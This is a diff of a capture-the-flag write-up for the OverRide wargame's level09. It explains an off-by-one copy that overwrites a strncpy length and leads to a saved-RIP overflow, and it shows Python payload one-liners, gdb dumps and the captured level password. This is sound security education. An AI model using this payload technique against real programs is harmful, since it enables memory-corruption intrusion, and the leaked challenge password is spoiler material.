@@ -15,10 +15,10 @@ level09@OverRide:~$ ./level09
 >: Msg sent!
 ```
 
-With the code we can see that we do a strncpy with a value contained in a variable.    
+With the code we can see that we do a strncpy with a value contained in a variable.
 
 ```c
-	strncpy(*buffer, msg, (int) *(*buffer + 180));
+ strncpy(*buffer, msg, (int) *(*buffer + 180));
 ```
 
 We must write a value at *buffer + 180. To do this, we can see that we can write 40 char. The difficulty is to identify that we can write 41 char instead of 40, because of 'i' must be <= 40.
@@ -26,12 +26,12 @@ Buffer[40] is the 41th char.
 
 ```c
 while (i <= 40 && username[i]) {
-		(*buffer)[140 + i] = username[i];
-		i++;
-	}
+  (*buffer)[140 + i] = username[i];
+  i++;
+ }
 ```
 
-Now we try to override the value at buffer[180]: 
+Now we try to override the value at buffer[180]:
 
 ```bash
 r < <(python -c 'print("a" * 41)'; python -c 'print("b" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1])')
@@ -42,7 +42,7 @@ r < <(python -c 'print("a" * 41)'; python -c 'print("b" * 200 + "\x00\x00\x55\x5
 
 Breakpoint 17, 0x000055555555491f in handle_msg ()
 (gdb) x/xw $rbp-0xc
-0x7fffffffe5c4:	0x00000061
+0x7fffffffe5c4: 0x00000061
 
 ```
 
@@ -50,13 +50,13 @@ We can see the value is 0x61 and we have write 97 char. (0x61 = 97):
 
 ```bash
 (gdb) x/64xg $rbp-0xc0
-0x7fffffffe510:	0x6262626262626262	0x6262626262626262
-0x7fffffffe520:	0x6262626262626262	0x6262626262626262
-0x7fffffffe530:	0x6262626262626262	0x6262626262626262
-0x7fffffffe540:	0x6262626262626262	0x6262626262626262
-0x7fffffffe550:	0x6262626262626262	0x6262626262626262
-0x7fffffffe560:	0x6262626262626262	0x6262626262626262
-0x7fffffffe570:	0x0000000000000062	0x0000555555554c10
+0x7fffffffe510: 0x6262626262626262 0x6262626262626262
+0x7fffffffe520: 0x6262626262626262 0x6262626262626262
+0x7fffffffe530: 0x6262626262626262 0x6262626262626262
+0x7fffffffe540: 0x6262626262626262 0x6262626262626262
+0x7fffffffe550: 0x6262626262626262 0x6262626262626262
+0x7fffffffe560: 0x6262626262626262 0x6262626262626262
+0x7fffffffe570: 0x0000000000000062 0x0000555555554c10
 ```
 
 So we want to override this variable to write on saved RIP. We search the offset.  
@@ -87,4 +87,9 @@ level09@OverRide:~$ (python -c 'print("\xff" * 41)'; python -c 'print("b" * 200 
 >>: >: Msg sent!
 cat /home/users/end/.pass
 j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+level09@OverRide:~$ su end
+Password: 
+
+end@OverRide:~$ cat end 
+GG !
 ```
